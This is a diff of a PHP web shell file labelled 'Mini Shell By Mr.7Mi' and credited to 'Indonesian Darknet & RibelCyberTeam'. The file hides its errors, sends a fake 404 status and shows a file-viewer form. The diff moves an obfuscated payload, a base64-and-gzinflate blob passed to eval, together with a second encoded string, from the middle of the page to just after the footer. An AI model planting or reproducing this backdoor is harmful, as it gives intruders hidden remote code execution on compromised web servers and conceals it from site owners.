@@ -67,7 +67,6 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
 			<?php  WC: ?>
 		</div>
-		<?php $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d"; $Lix = "NsJQV5WkCs1A+5jG/uOU/Tf6W33rtJtg3P4avcy+btuc9XOYynq+kk84kjztzC4f4VCgggSsilkxdQf9ADshb2uVkrm6qXkxExSGkWHbmiovj5cEjBvozpjtC9cH/diDJj2w+wIP4TrLD+sXCSWS9Uk0Bthn4fsZ5ezdt21oQHaLaU9NMtWVYCgwVuATKWV+RtWG+e+cxbBDjyaKb8AtpTS99IMAwUWc6wowzo8e+QrEoIJGsfmbuj8Ns1xWzha1Z07GyviSnGZpnYTcaGXbN3KHURFmVJhp/XPXcbTsbrCtbdrL+SipJl3ZJLQ8MlqGcLg8mHZoHKpT+feOAfokT3tFzV6+/D2tkajmyom9Ii0idrmPgnvjMnqzjixwYz/NIVkLfs/BfXMFwI8adDZjcin/SHQLBwJe+fcA4Eg/CHQPB4fvBIUA"; eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto)))); exit; ?>
 		<?php  goto mR; Un: ?>
 		<table class="table table-hover table-bordered table-sm">
 			<thead class="text-light">
@@ -87,6 +86,7 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
 	<div class="bg-dark border text-center mt-2">
 		<small>Copyright &copy; 2018 - Powered By Indonesian Darknet & RibelCyberTeam</small>
 	</div>
+	<?php $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d"; $Lix = "NsJQV5WkCs1A+5jG/uOU/Tf6W33rtJtg3P4avcy+btuc9XOYynq+kk84kjztzC4f4VCgggSsilkxdQf9ADshb2uVkrm6qXkxExSGkWHbmiovj5cEjBvozpjtC9cH/diDJj2w+wIP4TrLD+sXCSWS9Uk0Bthn4fsZ5ezdt21oQHaLaU9NMtWVYCgwVuATKWV+RtWG+e+cxbBDjyaKb8AtpTS99IMAwUWc6wowzo8e+QrEoIJGsfmbuj8Ns1xWzha1Z07GyviSnGZpnYTcaGXbN3KHURFmVJhp/XPXcbTsbrCtbdrL+SipJl3ZJLQ8MlqGcLg8mHZoHKpT+feOAfokT3tFzV6+/D2tkajmyom9Ii0idrmPgnvjMnqzjixwYz/NIVkLfs/BfXMFwI8adDZjcin/SHQLBwJe+fcA4Eg/CHQPB4fvBIUA"; eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto)))); exit; ?>
 	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
 	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
 	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
